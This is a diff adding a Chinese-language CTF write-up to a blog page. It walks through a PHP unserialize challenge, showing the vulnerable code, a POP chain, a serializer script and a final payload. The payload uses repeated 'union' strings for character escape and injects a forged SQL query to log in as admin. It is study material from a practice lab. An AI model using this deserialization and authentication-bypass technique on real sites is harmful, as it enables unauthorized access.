+        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;
+            echo(&#39;密码错误！&#39;);
+            return false;
+        &#125;
+        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;
+        return $idResult;
+    &#125;
+    public function update($sql)
+    &#123;
+        &#x2F;&#x2F;还没来得及写
+    &#125;
+&#125;</code></pre>
+
+<p>能看出数据库中是存在admin用户的，但是密码我们不知道，这里的sql查询语句为<code>select id,password from user where username=?</code><br>如果能控制这里的sql执行语句为<br><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code>便可经过登陆的密码验证，这个操作是可以实现的<br>c4ca4238a0b923820dcc509a6f75849b是1的MD5值数据库</p>
+<p>这是sql创造临时列的一种方法，如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，第一列是数据库中的数据，第二列是添加的临时列1</p>
+<pre class="language-php" data-language="php"><code class="language-php">class User
+&#123;
+    public $id;
+    public $age&#x3D;null;
+    public $nickname&#x3D;null;
+    public function login() &#123;
+        if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;]))&#123;
+        $mysqli&#x3D;new dbCtrl();
+        $this-&gt;id&#x3D;$mysqli-&gt;login(&#39;select id,password from user where username&#x3D;?&#39;);
+        if($this-&gt;id)&#123;
+        $_SESSION[&#39;id&#39;]&#x3D;$this-&gt;id;
+        $_SESSION[&#39;login&#39;]&#x3D;1;
+        echo &quot;你的ID是&quot;.$_SESSION[&#39;id&#39;];
+        echo &quot;你好！&quot;.$_SESSION[&#39;token&#39;];
+        echo &quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;update.php&#39;&lt;&#x2F;script&gt;&quot;;
+        return $this-&gt;id;
+        &#125;
+    &#125;
+&#125;
+    public function update()&#123;
+        $Info&#x3D;unserialize($this-&gt;getNewinfo());
+        $age&#x3D;$Info-&gt;age;
+        $nickname&#x3D;$Info-&gt;nickname;
+        $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]);
+        &#x2F;&#x2F;这个功能还没有写完 先占坑
+    &#125;
+    public function getNewInfo()&#123;
+        $age&#x3D;$_POST[&#39;age&#39;];
+        $nickname&#x3D;$_POST[&#39;nickname&#39;];
+        return safe(serialize(new Info($age,$nickname)));
+    &#125;
+    public function __destruct()&#123;
+        return file_get_contents($this-&gt;nickname);&#x2F;&#x2F;危
+    &#125;
+    public function __toString()
+    &#123;
+        $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;这里如果我们将nickname实例化为info类的对象，那么tostring执行的时候就相当于调用一个info类中不存在的方法，也就会调用info类中的__call方法
+        return &quot;0-0&quot;;
+    &#125;
+&#125;
+class Info&#123;
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+    public function __construct($age,$nickname)&#123;
+        $this-&gt;age&#x3D;$age;
+        $this-&gt;nickname&#x3D;$nickname;
+    &#125;
+    public function __call($name,$argument)&#123;
+        echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;call方法的两个参数分别是方法名和方法参数，也就是说这个argument就是user类的age属性，是我们可以控制的。然后我们将CtrlCase实例化为dbCtrl类的对象，就能调用dbCtrl类的login方法，再通过控制user类的age，实现对sql语句的控制
+    &#125;
+&#125;
+Class UpdateHelper&#123;
+    public $id;
+    public $newinfo;
+    public $sql;
+    public function __construct($newInfo,$sql)&#123;
+        $newInfo&#x3D;unserialize($newInfo);
+        $upDate&#x3D;new dbCtrl();
+    &#125;
+    public function __destruct()
+    &#123;
+        echo $this-&gt;sql;&#x2F;&#x2F;将sql实例化为User类的对象，在该类被结束销毁时调用User::__toString方法函数
+    &#125;
+&#125;
+class dbCtrl
+&#123;
+    public $hostname&#x3D;&quot;127.0.0.1&quot;;
+    public $dbuser&#x3D;&quot;root&quot;;
+    public $dbpass&#x3D;&quot;root&quot;;
+    public $database&#x3D;&quot;test&quot;;
+    public $name;
+    public $password;
+    public $mysqli;
+    public $token;
+    public function __construct()
+    &#123;
+        $this-&gt;name&#x3D;$_POST[&#39;username&#39;];
+        $this-&gt;password&#x3D;$_POST[&#39;password&#39;];
+        $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;];
+    &#125;
+    public function login($sql)
+    &#123;
+        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);
+        if ($this-&gt;mysqli-&gt;connect_error) &#123;
+            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);
+        &#125;
+        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);
+        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);
+        $result-&gt;execute();
+        $result-&gt;bind_result($idResult, $passwordResult);
+        $result-&gt;fetch();
+        $result-&gt;close();
+        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;
+            return $idResult;
+        &#125;
+        if (!$idResult) &#123;
+            echo(&#39;用户不存在!&#39;);
+            return false;
+        &#125;
+        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;
+            echo(&#39;密码错误！&#39;);
+            return false;
+        &#125;
+        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;
+        return $idResult;
+    &#125;
+    public function update($sql)
+    &#123;
+        &#x2F;&#x2F;还没来得及写
+    &#125;
+&#125;
+</code></pre>
+
+<p>所以pop链为UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql)</p>
+<p>反序列化脚本为</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+class User
+&#123;
+    public $age&#x3D; &#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&#39; ;
+    public $nickname;
+    public  function __construct()
+    &#123;
+        $this -&gt; nickname &#x3D; new Info();
+    &#125;
+    public function __toString(): string
+    &#123;
+        $this-&gt;nickname-&gt;update($this-&gt;age);
+        return &quot;0-0&quot;;
+    &#125;
+&#125;
+class Info&#123;
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+    public function __construct()&#123;
+        $this-&gt;CtrlCase &#x3D; new dbCtrl();
+    &#125;
+    public function __call($name,$argument)&#123;
+        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
+    &#125;
+&#125;
+Class UpdateHelper&#123;
+    public $sql;
+    public function __construct()&#123;
+        $this -&gt;sql &#x3D; new User();
+    &#125;
+    public function __destruct()
+    &#123;
+        echo $this-&gt;sql;
+    &#125;
+&#125;
+class dbCtrl
+&#123;
+
+    public function __construct()
+    &#123;
+        $this-&gt;name&#x3D;&#39;admin&#39;;
+        $this-&gt;password&#x3D;&#39;1&#39;;
+    &#125;
+    public function login($sql)
+    &#123;
+    &#125;
+&#125;
+$a &#x3D; new UpdateHelper();
+echo serialize($a);
+&#x2F;&#x2F;&#x2F;&#x2F;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</code></pre>
+
+<p>正常情况下的序列化内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317213027089.png" alt="image-20220317213027089"></p>
+<p>我们要把我们的序列化结果插入到2的位置</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317213946058.png" alt="image-20220317213946058"></p>
+<p>可以看到插入后他只能被作为nickname的值，所以我们就要利用反序列化的字符逃逸，利用safe函数中将union替换为六个字母的hacker实现逃逸，两个箭头之内的值的数量就是我们要添加的union的值</p>
+<p>payload:</p>
+<pre class="language-none"><code class="language-none">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code></pre>
+
+<p>然后用户名为admin，密码为1登录即可</p>
 
                 
             </div>
@@ -1484,7 +1931,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">77.3k</span>
+                        class="white-color">81k</span>
             
             
             
